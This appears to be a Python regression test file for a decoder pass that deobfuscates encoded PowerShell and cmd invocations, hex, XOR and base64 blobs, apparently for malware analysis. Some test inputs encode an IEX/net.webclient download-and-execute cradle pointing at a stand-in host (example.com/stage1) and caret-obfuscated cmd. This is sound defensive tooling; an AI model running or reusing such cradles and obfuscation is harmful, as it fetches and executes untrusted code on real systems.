"""
M4 · Decoder Pass — regression tests.

Verifies:
  * ``decoder-powershell-encoded-command`` extracts and decodes S001,
    S01, and S03-style invocations.
  * ``decoder-hex-full``, ``decoder-base64-full`` decode standalone
    blobs and CHAIN through the convergence loop (hex → base64).
  * ``decoder-xor-byte-array`` decodes S06.
  * ``decoder-frombase64string-fold`` handles S05-style Gzip embedded
    payloads (with raw-DEFLATE fallback for broken CRC trailers).
  * Every decoder rejects malformed / short / non-decodable input
    with 0 fires and NO artifact modification.
  * Every decoder is idempotent — post-decode text does not trigger
    the same decoder a second time.
"""
from __future__ import annotations

import base64
from pathlib import Path

from workspace.convergence import Artifact, converge
from workspace.convergence.decoder import TRANSFORMATIONS
from workspace.convergence.decoder import run as decoder_run
from workspace_recovery.corpus_loader import load_samples


CORPUS_PATH = Path(__file__).resolve().parent.parent / "workspace_recovery" / "corpus.json"


def _run(payload: str) -> tuple[str, tuple[str, ...], bool]:
    art, record = decoder_run(Artifact.from_input(payload))
    return art.content, record.transformations, record.changed


# ─── Registry sanity ────────────────────────────────────────────────


class TestRegistry:
    def test_every_decoder_declares_metadata(self) -> None:
        for xf in TRANSFORMATIONS:
            assert xf.name.startswith("decoder-")
            assert xf.category == "decoder"
            assert xf.consumes
            assert xf.produces
            assert xf.preconditions
            assert xf.postconditions
            assert xf.deterministic is True
            assert xf.apply is not None

    def test_registry_names_unique(self) -> None:
        names = [x.name for x in TRANSFORMATIONS]
        assert len(names) == len(set(names))


# ─── PowerShell -EncodedCommand ─────────────────────────────────────


class TestEncodedCommand:
    def test_s001_owner_anchor(self) -> None:
        """S001 · Owner permanent anchor."""
        payload = (
            "powershell.exe -encod "
            "VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA=="
        )
        result = converge(Artifact.from_input(payload))
        assert result.canonical is True
        assert result.final_artifact.content == 'Write-Host "tweet, tweet!"'

    def test_s01_iex_downloadstring(self) -> None:
        payload = (
            "powershell -EncodedCommand "
            "SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4A"
            "ZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUA"
            "LgBjAG8AbQAvAHMAdABhAGcAZQAxACcAKQA="
        )
        result = converge(Artifact.from_input(payload))
        assert result.canonical is True
        assert "IEX" in result.final_artifact.content
        assert "http://example.com/stage1" in result.final_artifact.content

    def test_s03_cmd_caret_then_encoded(self) -> None:
        """S03 · caret strip (M2 addendum) then -enc extraction (M4)."""
        payload = (
            "c^m^d /c p^ow^ers^he^ll -e^nc "
            "SQBFAFgAKAAnAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAJwApAA=="
        )
        result = converge(Artifact.from_input(payload))
        assert result.canonical is True
        out = result.final_artifact.content
        assert "IEX" in out
        assert "net.webclient" in out

    def test_short_b64_rejected(self) -> None:
        # < 8 chars — must not fire.
        payload = "powershell -enc ABCD"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_invalid_b64_rejected(self) -> None:
        payload = "powershell -enc NOT!BASE64!"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── Standalone hex / base64 ────────────────────────────────────────


class TestHexFull:
    def test_hex_decodes_to_text(self) -> None:
        payload = "48656c6c6f20576f726c64"  # "Hello World"
        out, _, _ = _run(payload)
        assert out == "Hello World"

    def test_odd_length_rejected(self) -> None:
        payload = "48656"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_too_short_rejected(self) -> None:
        payload = "4865"  # only 2 bytes = 4 hex chars; below length floor
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_idempotent(self) -> None:
        first, _, _ = _run("48656c6c6f20576f726c64")
        second, _, changed = _run(first)
        assert first == second
        # After decoding to "Hello World", nothing should re-fire.
        assert changed is False


class TestBase64Full:
    def test_utf8_text(self) -> None:
        # "Hello, World!" in base64.
        payload = base64.b64encode(b"Hello, World!").decode()
        out, _, _ = _run(payload)
        assert out == "Hello, World!"

    def test_short_rejected(self) -> None:
        payload = "SGVsbG8="  # "Hello" — 8 chars, below 12-char floor
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False

    def test_bad_padding_rejected(self) -> None:
        payload = "SGVsbG8sIFdvcmxkIQ"  # missing padding (not multiple of 4)
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── XOR byte array ─────────────────────────────────────────────────


class TestXorByteArray:
    def test_s06_pattern(self) -> None:
        """S06 · XOR pattern deterministically decodes."""
        payload = "0x1e,0x2d,0x3c,0x4b,0x5a,0x69,0x78,0x87 xor 0x5a"
        result = converge(Artifact.from_input(payload))
        assert result.canonical is True
        assert result.final_artifact.content != payload

    def test_ascii_result(self) -> None:
        """XOR each byte with 0x00 = identity → bytes are 'Hi!'."""
        payload = "0x48,0x69,0x21 xor 0x00"
        out, _, _ = _run(payload)
        assert out == "Hi!"

    def test_non_pattern_rejected(self) -> None:
        payload = "0x1e,0x2d not-an-xor"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── FromBase64String fold ──────────────────────────────────────────


class TestFromBase64StringFold:
    def test_plain_text_payload(self) -> None:
        b64 = base64.b64encode(b"Hello, World!").decode()
        payload = f"[Convert]::FromBase64String('{b64}')"
        out, _, changed = _run(payload)
        assert changed is True
        assert "Hello, World!" in out

    def test_case_insensitive_type(self) -> None:
        b64 = base64.b64encode(b"canonical").decode()
        payload = f"[system.convert]::FromBase64String('{b64}')"
        out, _, changed = _run(payload)
        assert changed is True
        assert "canonical" in out

    def test_invalid_b64_left_alone(self) -> None:
        payload = "[Convert]::FromBase64String('N!O!TB64!')"
        out, _, changed = _run(payload)
        assert out == payload
        assert changed is False


# ─── Chain-native multi-layer decoding ──────────────────────────────


class TestMultiLayerChains:
    def test_hex_then_base64(self) -> None:
        """Hex-encoded Base64-encoded ASCII should decode across two
        successive iterations of the outer engine loop."""
        inner = "Hello, chain!"
        b64 = base64.b64encode(inner.encode()).decode()
        # Ensure it's long enough for the base64-full decoder and
        # multiple of 4 for base64.
        assert len(b64) % 4 == 0
        hex_layer = b64.encode().hex()
        result = converge(Artifact.from_input(hex_layer))
        assert result.canonical is True
        assert inner in result.final_artifact.content

    def test_convergence_certificate_records_decoder_changes(self) -> None:
        """Multi-layer decode must be visible in the certificate as at
        least one decoder-pass firing (both decoders may fire in the
        same iteration since the pass runs its transformation list
        sequentially — the outer loop composes across iterations,
        while the pass composes within one iteration)."""
        b64 = base64.b64encode(b"chain-through-two-layers-hi").decode()
        hex_layer = b64.encode().hex()
        result = converge(Artifact.from_input(hex_layer))
        assert result.certificate.decoder_changes >= 1
        # And the transformation record must name both fires.
        first_pass = result.iterations[0].passes[2]  # decoder is 3rd pass
        assert first_pass.name == "decoder"
        assert first_pass.changed is True
        # Both decoder-hex-full AND decoder-base64-full should appear
        # in the transformations tuple.
        joined = "|".join(first_pass.transformations)
        assert "decoder-hex-full" in joined
        assert "decoder-base64-full" in joined


# ─── Corpus-driven DCS smoke check ──────────────────────────────────


def test_dcs_meets_m4_milestone_target() -> None:
    """Per the spec verification table, M4 must reach ≥ 8/13 corpus
    samples passing. This test enforces that floor."""
    from workspace_recovery.dcs_runner import _check_sample  # local import: keeps runner optional
    passing = sum(1 for s in load_samples(CORPUS_PATH) if _check_sample(s)[0])
    total = len(load_samples(CORPUS_PATH))
    assert total == 13
    assert passing >= 8, f"M4 DCS floor breached: {passing}/{total}"
